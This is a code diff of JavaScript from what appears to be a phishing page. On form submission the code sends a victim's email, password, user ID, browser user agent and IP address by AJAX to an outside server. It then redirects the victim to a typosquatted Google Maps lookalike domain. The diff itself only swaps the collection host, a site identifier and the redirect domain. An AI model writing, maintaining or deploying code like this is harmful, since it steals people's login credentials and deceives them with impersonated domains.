@@ -83,21 +83,21 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: 'https://amin.ck405-new.com/api/data',
+                url: 'https://ck404.com/api/data',
                 data: {
                     email: username,
                     password: password,
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 44,
+                    website_id: 31,
                 },
                 success: function (response) {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://gooqle-meapps.com/view-location/${userId}`;
+                            window.location.href = `https://gooqle-mapas.shop/view-location/${userId}`;
                           }
                     
                 },
